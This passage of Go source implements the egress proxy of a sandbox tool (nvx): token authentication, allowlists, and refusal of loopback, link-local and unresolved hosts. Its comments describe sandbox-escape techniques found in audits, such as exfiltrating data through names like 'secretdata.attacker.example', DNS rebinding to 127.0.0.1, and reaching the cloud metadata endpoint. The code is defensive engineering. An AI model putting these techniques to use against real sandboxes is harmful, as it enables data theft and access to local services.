package nvx

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/subtle"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

type hostPort struct {
	host string
	port uint16
}

// maxProxyRequestHeaderBytes caps the CONNECT request line and headers. The
// client is the sandboxed process and this proxy is nvx itself, outside the
// sandbox; an unbounded read let a contained process grow the parent's memory
// for as long as it kept sending bytes without a newline.
const maxProxyRequestHeaderBytes = 64 << 10

// proxyHandshakeTimeout bounds how long a client of either listener may take
// to finish its request: the CONNECT line and headers, or the SOCKS greeting,
// authentication and request. The client is the contained process, and without
// a bound one that connects and sends nothing holds a goroutine and a
// descriptor in nvx for as long as the run lasts. The loopback-redirect server
// bounds the same read with the same value (loopbackServer.serve).
//
// Lifted once the request is in: the tunnel that follows is not bounded. A var
// only so a test can shorten it, and read once per proxy, when it starts: a
// connection left over from an earlier test must not read it while the next
// test writes it.
var proxyHandshakeTimeout = connectDialTimeout

type EgressProxy struct {
	httpAddr  string
	socksAddr string
	httpLn    net.Listener
	socksLn   net.Listener
	// unixLn serves the same HTTP CONNECT handler on a UNIX socket, so a process
	// in a different network namespace can reach this proxy (see ListenUnix).
	unixLn   net.Listener
	unixPath string
	// denyHintOnce keeps the "here is how to allow it" line to one per run.
	//
	// A blocked host is usually blocked repeatedly -- a script retries, a package
	// manager fans out -- and repeating the remedy after every denial buries the
	// denials themselves. The environment-scrub warning taught that the same day
	// it shipped: a line printed on nearly every event stops being read.
	denyHintOnce sync.Once

	// handshakeTimeout is proxyHandshakeTimeout as it stood when the proxy
	// started. See handshakeBound.
	handshakeTimeout time.Duration

	// token authenticates this session's clients to this session's proxy.
	//
	// Every nvx sandbox on a machine shares one AppContainer package identity, and
	// Windows scopes its loopback restriction to the package -- so two projects
	// running at once are in the same loopback namespace and either one can connect
	// to the other's relay port. Without a credential that meant project B could
	// borrow project A's allowlist by port-scanning loopback, which an independent
	// acceptance pass demonstrated on 2026-08-19: B's own proxy refused a host, A's
	// established the tunnel. The same applies to the host-side TCP listeners, which
	// any local process can reach.
	//
	// The token travels as ordinary proxy credentials in HTTP_PROXY, so npm, node
	// and curl send it without knowing anything about nvx. A sibling that scans its
	// way to the port does not have it and gets 407.
	token string
	ctx   context.Context
	// allow is built once before any connection is served and never mutated, so it
	// needs no lock. session and prompted are written while connections are in
	// flight; promptMu guards both.
	allow    map[string]bool
	policy   Policy
	nvxHome  string
	promptMu sync.Mutex
	session  map[string]bool
	prompted map[string]bool
	// allowAudited holds the host:port keys whose first connection in this run has
	// been written to the audit log as an egress_allow. A sync.Map because every
	// connection is its own goroutine and the first one to a host is a race.
	allowAudited sync.Map
	cancel       context.CancelFunc
	// upstream is the user's own proxy, which allowed connections go through.
	// nil dials directly. See egress_upstream.go.
	upstream *upstreamProxy
}

func startEgressProxy(ctx context.Context, policy Policy, provider RuntimeProvider, nvxHome string) (*EgressProxy, error) {
	mode := strings.ToLower(strings.TrimSpace(policy.Isolation.Network.Mode))
	if mode == "open" {
		return nil, nil
	}

	allow := map[string]bool{}
	for _, entry := range policy.NetworkAllowlist(provider) {
		allow[normalizeAllowEntry(entry)] = true
	}

	token, err := newProxyToken()
	if err != nil {
		// Fail closed: an unauthenticated proxy is reachable by every sibling
		// sandbox and every local process, which is the hole this exists to close.
		return nil, fmt.Errorf("egress proxy credential: %w", err)
	}

	p := &EgressProxy{
		handshakeTimeout: proxyHandshakeTimeout,
		token:            token,
		allow:            allow,
		session:          map[string]bool{},
		policy:           policy,
		nvxHome:          nvxHome,
		prompted:         map[string]bool{},
		upstream:         upstreamProxyFromEnv(),
	}

	proxyCtx, cancel := context.WithCancel(ctx)
	p.cancel = cancel
	p.ctx = proxyCtx

	httpLn, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		cancel()
		return nil, fmt.Errorf("egress HTTP listen: %w", err)
	}
	p.httpAddr = httpLn.Addr().String()
	p.httpLn = httpLn

	socksLn, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		_ = httpLn.Close()
		cancel()
		return nil, fmt.Errorf("egress SOCKS listen: %w", err)
	}
	p.socksAddr = socksLn.Addr().String()
	p.socksLn = socksLn

	go p.serveHTTP(proxyCtx, httpLn)
	go p.serveSOCKS(proxyCtx, socksLn)
	return p, nil
}

// ListenUnix additionally serves the HTTP CONNECT proxy on a UNIX socket at path.
//
// A network namespace does not contain UNIX sockets -- they are filesystem
// objects -- so this is how a process inside the sandbox's loopback-only netns
// reaches a proxy that stays outside it and therefore still has real egress.
// The TCP listeners remain for the platforms that do not use a netns.
func (p *EgressProxy) ListenUnix(path string) error {
	if p == nil {
		return nil
	}
	// A stale socket from a crashed run would make Listen fail with EADDRINUSE.
	_ = os.Remove(path)

	ln, err := net.Listen("unix", path)
	if err != nil {
		return fmt.Errorf("egress proxy unix listen %s: %w", path, err)
	}
	// Only the sandbox's own user needs to reach it.
	if err := os.Chmod(path, 0o600); err != nil {
		_ = ln.Close()
		return fmt.Errorf("egress proxy socket permissions: %w", err)
	}
	p.unixLn = ln
	p.unixPath = path

	ctx := p.ctx
	if ctx == nil {
		ctx = context.Background()
	}
	go p.serveHTTP(ctx, ln)
	return nil
}

// UnixSocketPath returns the UNIX socket path, or "" if ListenUnix was not used.
func (p *EgressProxy) UnixSocketPath() string {
	if p == nil {
		return ""
	}
	return p.unixPath
}

func (p *EgressProxy) Close() {
	if p == nil || p.cancel == nil {
		return
	}
	p.cancel()
	if p.httpLn != nil {
		_ = p.httpLn.Close()
	}
	if p.socksLn != nil {
		_ = p.socksLn.Close()
	}
	if p.unixLn != nil {
		_ = p.unixLn.Close()
	}
	// The socket file outlives its listener; leaving it behind would make the
	// next run's Listen fail with EADDRINUSE.
	if p.unixPath != "" {
		_ = os.Remove(p.unixPath)
	}
}

// newProxyToken returns a fresh per-session credential. 128 bits: this is guessed
// online against a listener a sibling can reach, not stored.
func newProxyToken() (string, error) {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

// proxyCredential is the userinfo prefix for a proxy URL ("nvx:<token>@").
func (p *EgressProxy) proxyCredential() string {
	if p == nil || p.token == "" {
		return ""
	}
	return proxyAuthUser + ":" + p.token + "@"
}

// ProxyCredential exposes the userinfo for callers that build their own proxy URL
// -- the in-container relay, whose address differs from this proxy's.
func (p *EgressProxy) ProxyCredential() string {
	return p.proxyCredential()
}

const proxyAuthUser = "nvx"

func (p *EgressProxy) HTTProxyURL() string {
	if p == nil {
		return ""
	}
	return "http://" + p.proxyCredential() + p.httpAddr
}

func (p *EgressProxy) SOCKSProxyURL() string {
	if p == nil {
		return ""
	}
	return "socks5://" + p.proxyCredential() + p.socksAddr
}

func (p *EgressProxy) HTTPListenHostPort() (string, uint16) {
	return splitHostPort(p.httpAddr)
}

func (p *EgressProxy) SOCKSListenHostPort() (string, uint16) {
	return splitHostPort(p.socksAddr)
}

func splitHostPort(addr string) (string, uint16) {
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		return "127.0.0.1", 0
	}
	port, _ := strconv.ParseUint(portStr, 10, 16)
	return host, uint16(port)
}

func normalizeAllowEntry(entry string) string {
	entry = strings.TrimSpace(strings.ToLower(entry))
	if entry == "" {
		return ""
	}
	if !strings.Contains(entry, ":") {
		entry += ":*"
	}
	return entry
}

func parseHostPortSpec(host string, port uint16) hostPort {
	host = strings.TrimSpace(strings.ToLower(host))
	if host == "localhost" {
		host = "127.0.0.1"
	}
	return hostPort{host: host, port: port}
}

// sessionAllows reports whether this run has already approved any of keys.
//
// It exists so the lookup happens under promptMu. allowed() runs on every
// per-connection goroutine, so reading the map unlocked raced the prompt path's
// write and could abort the process with a concurrent map read/write.
func (p *EgressProxy) sessionAllows(keys []string) bool {
	p.promptMu.Lock()
	defer p.promptMu.Unlock()
	for _, k := range keys {
		if p.session[k] {
			return true
		}
	}
	return false
}

// allowKeysFor returns every allowlist entry a destination may legitimately
// match: the exact host:port and the host:* wildcard.
//
// Loopback expands to all three spellings, because parseHostPortSpec has already
// rewritten "localhost" to 127.0.0.1 by this point. Without that, a policy saying
// allow_hosts: ["localhost:3000"] would silently fail to match a request the user
// wrote as localhost, which is the shape most people reach for.
func allowKeysFor(hp hostPort) []string {
	hosts := []string{hp.host}
	if isLoopback(hp.host) {
		hosts = []string{"127.0.0.1", "localhost", "::1"}
	}
	keys := make([]string, 0, len(hosts)*2)
	for _, h := range hosts {
		keys = append(keys, fmt.Sprintf("%s:%d", h, hp.port), fmt.Sprintf("%s:*", h))
	}
	return keys
}

// explainHowToAllowOnce names the remedy for a blocked host, once per run.
//
// The loopback refusal has said what to do since it was written; the ordinary
// denial -- much the commoner one -- printed the host and stopped, leaving a
// reader who had never opened a policy file with nothing to act on.
//
// Not on the prompt-refused path below: someone who was asked and said no has
// already decided, and telling them how to undo it is noise.
func (p *EgressProxy) explainHowToAllowOnce(key string) {
	p.denyHintOnce.Do(func() {
		// A refusal detail rather than LogInfo: -q and --agent-mode hide LogInfo,
		// and the callers that run with them are the ones that cannot ask.
		LogRefusalDetail("%s", egressAllowHostRemedy(key))
	})
}

// egressAllowHostRemedy is the narrowest way to let one host through: the
// policy line itself, for the host that was refused.
func egressAllowHostRemedy(key string) string {
	return fmt.Sprintf("If that is meant, add %q to isolation.network.allow_hosts, for example "+
		`{"isolation":{"network":{"allow_hosts":[%q]}}}`+
		". Adding one counts as loosening, so a project .nvx-policy.json naming it needs approval, and ~/.nvx/policy.json does not.", key, key)
}

// admit decides whether the client may reach hp, and returns the addresses to
// dial when it may.
//
// The NAME is judged first and resolve runs only for a name that is already
// allowed: by the policy, by an earlier grant in this run, or by the person at
// the prompt. The handlers used to resolve before asking, so a contained
// process could send data out in the names it asked for. CONNECT
// secretdata.attacker.example:443 made nvx look the name up on the host's
// network and then answer 403. The sandboxes block a contained process's own
// DNS on every platform, which left this proxy as the way out.
//
// resolve is resolveEgressTarget in the handlers. It is called at most once,
// and the addresses it returns are the ones judged and dialled.
func (p *EgressProxy) admit(hp hostPort, resolve func(string) ([]net.IP, error)) ([]net.IP, bool) {
	// Before anything else: is this a name at all? Everything below prints
	// hp.host to a terminal or writes it to the audit log, and it is whatever
	// bytes the sandboxed client put in its request. See validEgressHost.
	if p.refuseInvalidHost(hp) {
		return nil, false
	}
	mode := strings.ToLower(strings.TrimSpace(p.policy.Isolation.Network.Mode))
	key := fmt.Sprintf("%s:%d", hp.host, hp.port)

	// A loopback destination used to be permitted unconditionally, whatever the
	// policy said (F38). That was survivable only while the contained process had
	// no route to this proxy: on Windows an AppContainer with no network
	// capability reached nothing at all, and on Linux a loopback-only netns has
	// its own 127.0.0.1, not the host's.
	//
	// The egress relay removed that premise on both. The proxy now runs in the
	// parent, OUTSIDE the containment, and dials on the contained process's
	// behalf -- so "permit all loopback" started meaning "permit every service on
	// the developer's machine": databases, dev servers, other agents' MCP
	// servers. Measured: a contained process read a host loopback service with an
	// empty allowlist.
	//
	// So loopback is now allowlisted like any other destination, which is what
	// README.md already described ("host services on localhost remain reachable
	// via allow_hosts"). network.mode "loopback" is the exception, because
	// permitting exactly these is the entire definition of that mode.
	if isLoopback(hp.host) && mode == "loopback" {
		return p.admitAllowed(hp, key, allowRuleModeLoopback, resolve)
	}
	// offline is no network at all, as README.md defines it, and that includes
	// hosts the allowlist names. The allowlist was consulted before this check,
	// so an offline run that reached the proxy got every allowlisted host --
	// on Linux, the relay and this socket were started in offline mode too, and
	// seccomp's refusal of connect() was all that stood between a contained
	// process and registry.npmjs.org. Refused here first, and the socket is no
	// longer offered in offline mode (prepareEgressSocket).
	if mode == "offline" {
		LogWarn("Blocked egress (network.mode=%s): %s", mode, key)
		auditLog(p.nvxHome, "egress_block_mode", map[string]string{"host": key, "mode": mode})
		return nil, false
	}

	keys := allowKeysFor(hp)
	for _, k := range keys {
		if p.allow[k] {
			return p.admitAllowed(hp, key, p.allowRule(k), resolve)
		}
	}
	if mode == "loopback" {
		LogWarn("Blocked egress (network.mode=%s): %s", mode, key)
		auditLog(p.nvxHome, "egress_block_mode", map[string]string{"host": key, "mode": mode})
		return nil, false
	}

	// A loopback destination is never grantable by prompt -- only by policy file.
	//
	// Reaching localhost when the policy says so is a supported case and stays
	// one: a dev server, a local registry, `allow_hosts: ["localhost:5432"]` in
	// README. What is withdrawn is the path where the CONTAINED PROCESS causes the
	// question to be asked. The prompt is triggered by whatever the sandbox is
	// running, which is the untrusted code, at a moment the developer is not
	// expecting a security question -- so a postinstall could ask, on its own
	// behalf, for access to the developer's local database.
	//
	// Loopback is where that matters most: the services listening there are the
	// ones that assume anything local is trusted and take no credentials --
	// Postgres, Redis, dev servers, other agents' MCP servers. An allowlist entry
	// someone typed into a policy file is a decision that can be read and diffed;
	// an answer to a prompt raised by untrusted code is not.
	//
	// The literal spellings are refused here, before asking. A NAME that
	// resolves to loopback is refused below, once it has been approved and
	// looked up.
	if isLoopback(hp.host) {
		p.refuseLoopbackGrant(key)
		return nil, false
	}
	// A literal link-local address is refused the same way, and for the same
	// reason. 169.254.169.254 is the cloud metadata endpoint, where one
	// unauthenticated GET returns credentials, so a question the contained process
	// chose to ask is not a reviewed decision about it. resolveEgressAddresses
	// refuses a NAME that resolves there but returns a literal address as itself,
	// so without this the literal went through on a yes.
	//
	// A policy entry naming the address still works, as it does for loopback,
	// because the allowlist was consulted above. A name that resolves to one is
	// refused after it is approved, by resolveEgressAddresses.
	if isLinkLocalLiteral(hp.host) {
		p.refuseLinkLocalGrant(key)
		return nil, false
	}

	if !p.sessionAllows(keys) && !p.askUnknownHost(key) {
		return nil, false
	}

	// Approved by a person, by name, so the name may now be looked up. The
	// address is judged on every request, and a grant does not skip it.
	ips, ok := p.resolveAdmitted(hp, key, resolve)
	if !ok {
		return nil, false
	}
	// The ADDRESS as well as the name, because a name is exactly how you reach
	// 127.0.0.1 without typing it. `cache.attacker.example` with an A record of
	// 127.0.0.1 walked past the literal check above and was granted at the
	// prompt. Found by an independent acceptance pass on 2026-09-03.
	//
	// Judged on every request, after the session grant as well as after the
	// prompt. A grant given while a name resolved publicly is keyed on the name,
	// so a later request for the same name, its record now 127.0.0.1, would
	// otherwise be dialled without the address ever being looked at.
	if anyLoopback(ips) {
		p.refuseLoopbackGrant(key)
		return nil, false
	}
	// A name that did not resolve is not dialled on a person's grant either. The
	// dial's own second lookup cannot tell a prompt-approved name from an
	// allowlisted one, so it applies only the link-local check. SERVFAIL to this
	// lookup and 127.0.0.1 to the dial's therefore walked through the loopback
	// refusal above: the same shape closed for link-local the day before, found by
	// an independent audit on 2026-09-06. Allowlisted names are not affected; they
	// returned above, and a transient DNS failure there stays the dial's problem.
	if len(ips) == 0 {
		LogWarn("Blocked egress: %s did not resolve, and nvx does not dial an approved name whose address it has not seen.", key)
		auditLog(p.nvxHome, "egress_deny_unresolved_prompt", map[string]string{"host": key})
		return nil, false
	}
	return ips, true
}

// resolveAdmitted resolves a name admit has allowed, once, and refuses it when
// the answer is link-local. See resolveEgressAddresses.
func (p *EgressProxy) resolveAdmitted(hp hostPort, key string, resolve func(string) ([]net.IP, error)) ([]net.IP, bool) {
	ips, err := resolve(hp.host)
	if err != nil {
		LogWarn("Blocked egress: %v", err)
		auditLog(p.nvxHome, "egress_deny_resolved", map[string]string{"host": key})
		return nil, false
	}
	return ips, true
}

// The rules an egress_allow audit record can name. They are the settings a person
// can open and change, so a reader of the log knows where to look.
const (
	allowRuleDefaultAllow = "default_allow"
	allowRuleAllowHosts   = "allow_hosts"
	allowRuleModeLoopback = "mode_loopback"
)

// admitAllowed finishes admitting a destination the policy allows. It resolves
// the name once, as resolveAdmitted does, and records the first connection this
// run makes to it. See auditAllowOnce.
func (p *EgressProxy) admitAllowed(hp hostPort, key, rule string, resolve func(string) ([]net.IP, error)) ([]net.IP, bool) {
	ips, ok := p.resolveAdmitted(hp, key, resolve)
	if ok {
		p.auditAllowOnce(key, rule)
	}
	return ips, ok
}

// auditAllowOnce writes an egress_allow record for key, naming the rule that
// allowed it, the first time this run reaches it and never again.
//
// Once, because a package manager opens many connections to one registry and a
// record for each would bury the refusals this log is read for. A host approved
// at the prompt is not written here. Its own record, egress_allow_prompted, was
// written when the person answered.
func (p *EgressProxy) auditAllowOnce(key, rule string) {
	if _, seen := p.allowAudited.LoadOrStore(key, true); seen {
		return
	}
	auditLog(p.nvxHome, "egress_allow", map[string]string{"host": key, "rule": rule})
}

// allowRule names the policy setting that put entry on the allowlist. That is
// allow_hosts when a person listed it there, even if default_allow holds it too,
// and default_allow for everything else on the list. Those are the shipped hosts,
// and the runtime's own when the policy sets none.
func (p *EgressProxy) allowRule(entry string) string {
	for _, h := range p.policy.Isolation.Network.AllowHosts {
		if normalizeAllowEntry(h) == entry {
			return allowRuleAllowHosts
		}
	}
	return allowRuleDefaultAllow
}

// refuseLoopbackGrant reports a local service refused on the prompt path. See
// the loopback refusal in admit.
func (p *EgressProxy) refuseLoopbackGrant(key string) {
	LogWarn("Blocked egress to a local service: %s", key)
	LogInfo("nvx does not offer local services through a prompt, because the contained process is what triggers it. "+
		"If this is meant, add %q to isolation.network.allow_hosts in the project policy, or use --connect for one run.", key)
	auditLog(p.nvxHome, "egress_deny_loopback_prompt", map[string]string{"host": key})
}

// refuseLinkLocalGrant reports a link-local address refused on the prompt path.
// See the link-local refusal in admit. The remedy names allow_hosts alone,
// because --connect reaches a service on this machine's loopback and nothing else.
func (p *EgressProxy) refuseLinkLocalGrant(key string) {
	LogWarn("Blocked egress to a link-local address: %s", key)
	LogInfo("nvx does not offer link-local addresses, such as the cloud metadata endpoint, through a prompt, because the contained process is what triggers it. "+
		"If this is meant, add %q to isolation.network.allow_hosts in the project policy.", key)
	auditLog(p.nvxHome, "egress_deny_link_local_prompt", map[string]string{"host": key})
}

// askUnknownHost asks once per run whether key may be reached, and reports the
// answer. The question names the host and port only, and nothing has been
// looked up when it is asked.
func (p *EgressProxy) askUnknownHost(key string) bool {
	if !p.policy.Isolation.Network.PromptUnknown {
		LogWarn("Blocked egress: %s", key)
		p.explainHowToAllowOnce(key)
		auditLog(p.nvxHome, "egress_deny", map[string]string{"host": key})
		return false
	}

	p.promptMu.Lock()
	defer p.promptMu.Unlock()
	if p.prompted[key] {
		return p.session[key]
	}
	p.prompted[key] = true

	msg := fmt.Sprintf("Allow outbound connection to %s for the rest of this run?", key)
	if !promptTrustBoundaryWithRemedy(msg, egressAllowHostRemedy(key)) {
		LogWarn("Blocked egress: %s", key)
		auditLog(p.nvxHome, "egress_deny", map[string]string{"host": key})
		return false
	}
	// This run only. It used to also write the host into the project policy, so a
	// single yes was a permanent grant -- the prompt said "allow outbound
	// connection to X?", mentioned no persistence, and the field it set is called
	// `session`. An acceptance pass approved one host, then reached it in a later
	// run with no prompt and no trust environment at all.
	//
	// Persisting is still available and is now only the deliberate form: write the
	// host into isolation.network.allow_hosts, where it can be reviewed in a diff
	// like every other policy decision.
	p.session[key] = true
	auditLog(p.nvxHome, "egress_allow_prompted", map[string]string{"host": key})
	return true
}

func isLoopback(host string) bool {
	host = strings.ToLower(strings.TrimSpace(host))
	host = strings.TrimSuffix(strings.TrimPrefix(host, "["), "]")
	if host == "localhost" || host == "127.0.0.1" || host == "::1" {
		return true
	}
	ip := net.ParseIP(host)
	// IsUnspecified as well as IsLoopback. 0.0.0.0 and :: are not loopback
	// addresses, so IsLoopback answers false, but connecting to either reaches
	// 127.0.0.1. They slipped past this refusal into the ordinary prompt, where
	// "Allow outbound connection to 0.0.0.0:5432?" read as an unfamiliar external
	// host rather than the developer's own database. Audit 2026-09-17, P2/P8.
	return ip != nil && (ip.IsLoopback() || ip.IsUnspecified())
}

// acceptRetryDelay is how long an accept loop waits after a failed Accept.
//
// Without it a lasting error, such as running out of file descriptors, turned
// the loop into a busy spin on one core for as long as the error lasted.
const acceptRetryDelay = 50 * time.Millisecond

// acceptBackoff waits before the next Accept, and reports false once ctx is
// done and the loop should end.
func acceptBackoff(ctx context.Context) bool {
	select {
	case <-ctx.Done():
		return false
	case <-time.After(acceptRetryDelay):
		return true
	}
}

func (p *EgressProxy) serveHTTP(ctx context.Context, ln net.Listener) {
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			if !acceptBackoff(ctx) {
				return
			}
			continue
		}
		go p.handleHTTPConn(conn)
	}
}

// handshakeBound is the proxy's handshake bound, or the default for a proxy
// built without startEgressProxy.
func (p *EgressProxy) handshakeBound() time.Duration {
	if p.handshakeTimeout > 0 {
		return p.handshakeTimeout
	}
	return connectDialTimeout
}

func (p *EgressProxy) handleHTTPConn(client net.Conn) {
	defer client.Close()
	// Capped for the header phase and lifted after it, in bytes and in time:
	// what follows the headers is the tunnel, and must not be bounded. See
	// maxProxyRequestHeaderBytes and proxyHandshakeTimeout.
	_ = client.SetReadDeadline(time.Now().Add(p.handshakeBound()))
	lim := &io.LimitedReader{R: client, N: maxProxyRequestHeaderBytes}
	br := bufio.NewReader(lim)
	req, err := br.ReadString('\n')
	if err != nil {
		return
	}
	parts := strings.Fields(req)
	if len(parts) < 3 {
		return
	}
	method := strings.ToUpper(parts[0])

	if method == "CONNECT" {
		host, portStr, err := net.SplitHostPort(parts[1])
		if err != nil {
			return
		}

		// Read the remaining CONNECT request headers up to the blank line, and
		// keep the credential out of them. They must be consumed either way:
		// otherwise the buffered bytes (Host:, etc.) would be forwarded to the
		// remote ahead of the client's TLS ClientHello, corrupting the handshake
		// (ERR_SSL_PACKET_LENGTH_TOO_LONG).
		var auth string
		for {
			line, lerr := br.ReadString('\n')
			if lerr != nil {
				return
			}
			if line == "\r\n" || line == "\n" {
				break
			}
			if name, value, ok := strings.Cut(line, ":"); ok &&
				strings.EqualFold(strings.TrimSpace(name), "Proxy-Authorization") {
				auth = strings.TrimSpace(value)
			}
		}

		lim.N = 1 << 62 // headers read; the tunnel is not bounded
		_ = client.SetReadDeadline(time.Time{})

		// Authenticate before consulting the allowlist, so a sibling sandbox
		// scanning loopback cannot use the 403/200 difference to learn what this
		// session is permitted to reach.
		//
		// The destination is judged after that as well, as on the SOCKS path. An
		// invalid host used to be refused first, with a terminal warning and an
		// audit record, for anyone who could reach the listener.
		//
		// The 407 is a complete response that says the connection ends. git sends
		// its first CONNECT with no credential and waits for a 407 to choose an
		// authentication method, and libcurl gave up with "Proxy CONNECT aborted"
		// on a 407 that had no Content-Length and then closed, for every host. Measured
		// with git 2.39.5 (libcurl 7.88.1) in a contained run on Linux, Content-Length: 0
		// alone did not help and adding Connection: close did, because libcurl then
		// reconnects with the credential instead of reusing a connection about to end.
		if !p.authorized(auth) {
			_, _ = fmt.Fprintf(client, "HTTP/1.1 407 Proxy Authentication Required\r\nProxy-Authenticate: Basic realm=\"nvx\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
			return
		}
		// A port that does not parse is refused. The parse error used to be
		// dropped, so "443x" went on as port 0 and "99999" as 65535.
		port, perr := strconv.ParseUint(portStr, 10, 16)
		if perr != nil || port == 0 {
			_, _ = fmt.Fprintf(client, "HTTP/1.1 400 Bad Request\r\n\r\n")
			return
		}
		hp := parseHostPortSpec(host, uint16(port))
		if p.refuseInvalidHost(hp) {
			_, _ = fmt.Fprintf(client, "HTTP/1.1 400 Bad Request\r\n\r\n")
			return
		}
		// What gets logged from here on is the parsed, validated host and port.
		// The raw request target came from the sandboxed process and could carry
		// terminal escapes in its port part.
		target := net.JoinHostPort(hp.host, strconv.Itoa(int(hp.port)))
		// The name is judged before it is looked up, and an allowed name is
		// resolved ONCE, inside admit. Everything below dials that same answer.
		// See resolveEgressAddresses for what resolving twice cost.
		ips, ok := p.admit(hp, resolveEgressTarget)
		if !ok {
			_, _ = fmt.Fprintf(client, "HTTP/1.1 403 Forbidden\r\n\r\n")
			return
		}
		remote, err := p.dialAllowed(ips, hp)
		if err != nil {
			// Say which addresses were tried and what the last one said.
			//
			// This path emitted a bare 502 and logged nothing, so a contained
			// command saw the tunnel refuse an ALLOWED host with no reason
			// recorded anywhere -- indistinguishable from the allowlist denying
			// it, which is a 403 and an entirely different fix. Measured
			// 2026-09-21 on a GitHub windows-latest runner: 502 for a listener
			// the proxy's own process had connected to seconds earlier, and
			// nothing in the log to say whether resolution, the allowlist or the
			// dial itself was responsible.
			//
			// The host is already in this connection's audit record and the
			// addresses are nvx's own resolution of it, so neither puts anything
			// in the log that is not there already. The format is a literal, as
			// LogWarn requires.
			LogWarn("Egress relay could not reach an allowed host: %s (tried %s): %v",
				target, formatEgressIPs(ips), err)
			_, _ = fmt.Fprintf(client, "HTTP/1.1 502 Bad Gateway\r\n\r\n")
			return
		}
		defer remote.Close()
		_, _ = fmt.Fprintf(client, "HTTP/1.1 200 Connection Established\r\n\r\n")
		go func() {
			_, _ = io.Copy(remote, br)
		}()
		_, _ = io.Copy(client, remote)
		return
	}

	_, _ = fmt.Fprintf(client, "HTTP/1.1 405 Method Not Allowed\r\n\r\n")
}

// socksAuthenticate completes SOCKS5 method negotiation, requiring username /
// password (RFC 1929) whenever this session has a token. Returns false if the
// client cannot or will not authenticate, having already told it so.
func (p *EgressProxy) socksAuthenticate(conn net.Conn, offered []byte) bool {
	const (
		methodNoAuth   = 0x00
		methodUserPass = 0x02
		methodNone     = 0xFF
	)
	if p.token == "" {
		_, _ = conn.Write([]byte{0x05, methodNoAuth})
		return true
	}
	if !bytesContain(offered, methodUserPass) {
		_, _ = conn.Write([]byte{0x05, methodNone})
		return false
	}
	if _, err := conn.Write([]byte{0x05, methodUserPass}); err != nil {
		return false
	}

	// Sub-negotiation: version, ulen, uname, plen, passwd.
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(conn, hdr); err != nil || hdr[0] != 0x01 {
		return false
	}
	user := make([]byte, int(hdr[1]))
	if _, err := io.ReadFull(conn, user); err != nil {
		return false
	}
	plen := make([]byte, 1)
	if _, err := io.ReadFull(conn, plen); err != nil {
		return false
	}
	pass := make([]byte, int(plen[0]))
	if _, err := io.ReadFull(conn, pass); err != nil {
		return false
	}

	ok := string(user) == proxyAuthUser &&
		subtle.ConstantTimeCompare(pass, []byte(p.token)) == 1
	if !ok {
		_, _ = conn.Write([]byte{0x01, 0x01}) // failure
		return false
	}
	_, _ = conn.Write([]byte{0x01, 0x00}) // success
	return true
}

func bytesContain(b []byte, want byte) bool {
	for _, x := range b {
		if x == want {
			return true
		}
	}
	return false
}

// authorized checks a Proxy-Authorization header value against this session's
// token. Compared in constant time: the check runs against a listener any local
// process can talk to as often as it likes.
func (p *EgressProxy) authorized(header string) bool {
	if p.token == "" {
		return true
	}
	scheme, encoded, ok := strings.Cut(strings.TrimSpace(header), " ")
	if !ok || !strings.EqualFold(scheme, "Basic") {
		return false
	}
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(encoded))
	if err != nil {
		return false
	}
	user, pass, ok := strings.Cut(string(raw), ":")
	if !ok || user != proxyAuthUser {
		return false
	}
	return subtle.ConstantTimeCompare([]byte(pass), []byte(p.token)) == 1
}

func (p *EgressProxy) serveSOCKS(ctx context.Context, ln net.Listener) {
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			if !acceptBackoff(ctx) {
				return
			}
			continue
		}
		go p.handleSOCKSConn(conn)
	}
}

func (p *EgressProxy) handleSOCKSConn(conn net.Conn) {
	defer conn.Close()
	// Bounded until the request is in, for the reason the HTTP path is; see
	// proxyHandshakeTimeout. Cleared below, before the tunnel.
	_ = conn.SetReadDeadline(time.Now().Add(p.handshakeBound()))
	buf := make([]byte, 262)
	if _, err := io.ReadFull(conn, buf[:2]); err != nil {
		return
	}
	nMethods := int(buf[1])
	if _, err := io.ReadFull(conn, buf[:nMethods]); err != nil {
		return
	}
	// Same credential as the HTTP path, over RFC 1929. Leaving SOCKS open while
	// HTTP is authenticated would just move the sibling-borrows-the-allowlist hole
	// one port along.
	if !p.socksAuthenticate(conn, buf[:nMethods]) {
		return
	}

	if _, err := io.ReadFull(conn, buf[:4]); err != nil {
		return
	}
	if buf[1] != 0x01 {
		return
	}

	var host string
	var port uint16
	switch buf[3] {
	case 0x01:
		if _, err := io.ReadFull(conn, buf[:4+2]); err != nil {
			return
		}
		host = net.IP(buf[:4]).String()
		port = binary.BigEndian.Uint16(buf[4:6])
	case 0x03:
		if _, err := io.ReadFull(conn, buf[:1]); err != nil {
			return
		}
		l := int(buf[0])
		if _, err := io.ReadFull(conn, buf[:l+2]); err != nil {
			return
		}
		host = string(buf[:l])
		port = binary.BigEndian.Uint16(buf[l : l+2])
	default:
		return
	}
	_ = conn.SetReadDeadline(time.Time{})

	hp := parseHostPortSpec(host, port)
	if p.refuseInvalidHost(hp) {
		_, _ = conn.Write([]byte{0x05, 0x02, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	// Judged by name, then resolved once if allowed. See the CONNECT path.
	ips, ok := p.admit(hp, resolveEgressTarget)
	if !ok {
		_, _ = conn.Write([]byte{0x05, 0x02, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	remote, err := p.dialAllowed(ips, hp)
	if err != nil {
		_, _ = conn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	defer remote.Close()
	_, _ = conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
	go func() {
		_, _ = io.Copy(remote, conn)
	}()
	_, _ = io.Copy(conn, remote)
}

// nodeUseEnvProxy is the variable that makes Node's own HTTP clients read the
// proxy variables. Without it fetch(), http and https ignore HTTP_PROXY and
// HTTPS_PROXY, so a contained program using them connected directly, and the
// sandbox refused that. Measured 2026-10-07, a contained fetch() to an allowlisted
